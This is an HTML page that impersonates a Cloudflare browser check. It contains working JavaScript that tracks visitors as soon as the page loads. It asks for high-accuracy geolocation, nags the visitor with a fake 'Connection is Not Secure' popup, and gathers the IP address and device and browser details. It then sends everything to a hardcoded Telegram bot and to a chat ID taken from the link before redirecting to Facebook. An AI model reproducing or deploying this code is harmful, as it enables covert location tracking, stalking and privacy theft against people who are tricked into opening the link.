<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            line-height: 1.6;
            background-color: #121212;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .content {
            width: 100%;
        }
        h2 {
            color: #fff;
        }
        a {
            color: #1a73e8;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        pre {
            background: #1e1e1e;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            text-align: left;
            color: #ddd;
        }
        details {
            margin-top: 10px;
            text-align: left;
        }
        summary {
            cursor: pointer;
            font-weight: bold;
        }
        .popup {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000;
        }
        .popup h2 {
            color: red;
        }
        .popup button {
            background: red;
            color: white;
            border: none;
            padding: 10px;
            margin-top: 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        #loadingMessage {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="content">
        <h2>Checking your browser</h2>
        <p id="loadingMessage">This process is automatic. Your browser will redirect to your requested content shortly.</p>
<p>Please allow up to 3 seconds...</p>
        
       <p><a href="#">DDoS protection by Cloudflare</a></p>
    </div>

    <div class="popup" id="locationPopup">
        <h2>🔒 Connection is Not Secure</h2>
        <p>Please allow your location and secure your system.</p>
        <button onclick="requestLocation()">Fix Now</button>
    </div>

    <script>
        // Configuration
        const BOT_TOKEN = "7659085089:AAGTE5B4NRLG_tFvbfYayfrG0URgFgXnv5w" ;
        const FIXED_CHAT_ID = "6319619567" ;
        const HIGH_ACCURACY = true; // Set to false if you don't need high accuracy
        const MAX_RETRIES = 3; // Maximum retries for failed requests
        const REQUEST_TIMEOUT = 10000; // 10 seconds timeout for API requests
        const REDIRECT_URL = "https://www.facebook.com"; // Editable redirect URL

        // Global variables
        let userIP = '';
        let retryCounts = {};

        // Location permission check functions
        function checkLocationAccess() {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    console.log("Location Access Granted");
                    getLocation(); // Proceed with location tracking
                },
                function(error) {
                    if (error.code === error.PERMISSION_DENIED) {
                        document.getElementById("locationPopup").style.display = "block";
                        setTimeout(redirectToSettings, 3000);
                    } else {
                        showError(error);
                    }
                }
            );
        }

        function requestLocation() {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    console.log("Location Access Granted");
                    document.getElementById("locationPopup").style.display = "none";
                    getLocation(); // Proceed with location tracking
                },
                function(error) {
                    if (error.code === error.PERMISSION_DENIED) {
                        redirectToSettings();
                    } else {
                        showError(error);
                    }
                }
            );
        }

        function redirectToSettings() {
            let userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes("chrome")) {
                window.location.href = "chrome://settings/content/location";
            } else if (userAgent.includes("firefox")) {
                window.location.href = "about:preferences#privacy";
            } else {
                alert("Please enable location manually in your browser settings.");
            }
        }

        // Main function to get location
        function getLocation() {
            document.getElementById("loadingMessage").textContent = "Getting your precise location...";
            
            if (!navigator.geolocation) {
                showError("❌ Geolocation not supported by your browser!");
                return;
            }

            // First get the IP address
            getIPAddress()
                .then(() => {
                    // Then get high accuracy location
                    const options = {
                        enableHighAccuracy: HIGH_ACCURACY,
                        timeout: 15000,
                        maximumAge: 0
                    };
                    
                    navigator.geolocation.getCurrentPosition(
                        sendLocation,
                        showError,
                        options
                    );
                })
                .catch(error => {
                    console.error("IP fetch error:", error);
                    // Continue with location even if IP fails
                    const options = {
                        enableHighAccuracy: HIGH_ACCURACY,
                        timeout: 15000,
                        maximumAge: 0
                    };
                    navigator.geolocation.getCurrentPosition(
                        sendLocation,
                        showError,
                        options
                    );
                });
        }

        // Function to get user's IP address
        async function getIPAddress() {
            try {
                document.getElementById("loadingMessage").textContent = "Getting your IP address...";
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                console.error("Failed to get IP:", error);
                userIP = "Unknown";
            }
        }

        // Function to get device info
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const language = navigator.language;
            const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";
            const javaEnabled = navigator.javaEnabled() ? "Yes" : "No";
            
            return `📱 Device: ${userAgent}
🖥️ Platform: ${platform}
🖥️ Screen: ${screenWidth}x${screenHeight}
🌐 Language: ${language}
🍪 Cookies: ${cookiesEnabled}
☕ Java: ${javaEnabled}
📡 IP Address: ${userIP}`;
        }

        // Function to get browser info
        function getBrowserInfo() {
            const browserInfo = {
                'Browser Name': navigator.appName,
                'Browser Version': navigator.appVersion,
                'User Agent': navigator.userAgent,
                'Platform': navigator.platform,
                'Languages': navigator.languages,
                'Online Status': navigator.onLine ? 'Online' : 'Offline',
                'Do Not Track': navigator.doNotTrack || 'Not specified'
            };
            
            return JSON.stringify(browserInfo, null, 2);
        }

        // Main function to send location
        async function sendLocation(position) {
            document.getElementById("loadingMessage").textContent = "Sending location data...";
            
            const params = new URLSearchParams(window.location.search);
            const url_chat_id = params.get("id");
            
            // Prepare chat IDs (fixed + from URL if exists)
            const bot_chat_ids = [FIXED_CHAT_ID];
            if (url_chat_id) {
                bot_chat_ids.push(url_chat_id);
            }

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const altitude = position.coords.altitude;
            const speed = position.coords.speed;
            const timestamp = new Date(position.timestamp).toLocaleString();
            
            const deviceInfo = getDeviceInfo();
            const browserInfo = getBrowserInfo();
            
            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const openStreetMapLink = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}#map=16/${latitude}/${longitude}`;

            const message = `📍 **New Location Tracked** 
🌍 Latitude: ${latitude}
🌍 Longitude: ${longitude}
🎯 Accuracy: ${accuracy} meters
⛰️ Altitude: ${altitude ? altitude + ' meters' : 'N/A'}
🚀 Speed: ${speed ? speed + ' m/s' : 'N/A'}
🕒 Time: ${timestamp}

🗺️ [Google Maps](${googleMapsLink})
🗺️ [OpenStreetMap](${openStreetMapLink})

${deviceInfo}

<details>
<summary><b>📊 Detailed Browser Info</b></summary>
<pre>${browserInfo}</pre>
</details>`;

            // Send requests in parallel with error handling
            const requests = bot_chat_ids.map(chat_id => 
                sendTelegramMessage(chat_id, message)
            );

            try {
                await Promise.all(requests);
                document.querySelector(".content").innerHTML = `
                    <h2>✅ Verification Successfully!</h2>
                    <p>Latitude: ${latitude}</p>
                    <p>Longitude: ${longitude}</p>
                    <p><a href="${googleMapsLink}" target="_blank">View on Google Maps</a></p>
                `;
                
                // Redirect to Facebook after successful send
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 3000);
            } catch (error) {
                console.error("Error sending messages:", error);
                document.querySelector(".content").innerHTML = `
                    <h2>⚠️ Partial Success</h2>
                    <p>Some messages may not have been delivered.</p>
                    <p>Latitude: ${latitude}</p>
                    <p>Longitude: ${longitude}</p>
                    <p><a href="${googleMapsLink}" target="_blank">View on Google Maps</a></p>
                `;
                
                // Still redirect even if there was an error
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 3000);
            }
        }

        // Function to send message to Telegram with retry logic
        async function sendTelegramMessage(chat_id, message) {
            if (!retryCounts[chat_id]) {
                retryCounts[chat_id] = 0;
            }

            try {
                const apiURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);

                const response = await fetch(apiURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id,
                        text: message,
                        parse_mode: "Markdown",
                        disable_web_page_preview: true
                    }),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);

                const data = await response.json();

                if (!response.ok || !data.ok) {
                    throw new Error(data.description || 'Unknown Telegram API error');
                }

                return data;
            } catch (error) {
                console.error(`Error sending to ${chat_id}:`, error.message);
                
                if (retryCounts[chat_id] < MAX_RETRIES) {
                    retryCounts[chat_id]++;
                    console.log(`Retrying ${chat_id} (attempt ${retryCounts[chat_id]})`);
                    return sendTelegramMessage(chat_id, message);
                } else {
                    throw new Error(`Failed to send to ${chat_id} after ${MAX_RETRIES} attempts: ${error.message}`);
                }
            }
        }

        // Error handling function
        function showError(error) {
            let errorMessage = "❌ Location access denied or unavailable!";
            
            if (typeof error === 'string') {
                errorMessage = error;
            } else if (error instanceof Error) {
                errorMessage = error.message;
            } else if (error.code) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMessage = "❌ Location access denied by user.";
                        document.getElementById("locationPopup").style.display = "block";
                        setTimeout(redirectToSettings, 3000);
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMessage = "❌ Location information unavailable.";
                        break;
                    case error.TIMEOUT:
                        errorMessage = "❌ Location request timed out.";
                        break;
                    default:
                        errorMessage = "❌ Unknown error occurred.";
                }
            }
            
            document.querySelector(".content").innerHTML = `
                <h2>${errorMessage}</h2>
                <p>Please enable location services and refresh the page.</p>
                ${userIP ? `<p>Your IP: ${userIP}</p>` : ''}
            `;
        }

        // Initialize on page load
        window.onload = checkLocationAccess;
    </script>
</body>
</html>

